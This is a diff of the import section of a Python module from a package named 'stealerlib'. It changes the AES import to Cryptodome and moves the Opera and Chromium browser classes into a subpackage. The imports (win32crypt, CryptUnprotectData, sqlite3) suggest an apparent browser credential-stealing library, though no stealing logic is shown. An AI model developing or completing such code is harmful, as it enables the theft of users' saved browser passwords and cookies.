@@ -13,15 +13,15 @@ import sqlite3
 import tempfile
 import win32crypt
 
-from Crypto.Cipher import AES
+from Cryptodome.Cipher import AES
 from typing import Union, Optional
 from datetime import datetime, timedelta
 from win32crypt import CryptUnprotectData
 
 from stealerlib.exceptions import catch
 
-from stealerlib.browser.opera import Opera
-from stealerlib.browser.chromium import Chromium
+from stealerlib.browser.browsers.opera import Opera
+from stealerlib.browser.browsers.chromium import Chromium
 from stealerlib.browser.types import BrowserTypes
 
 
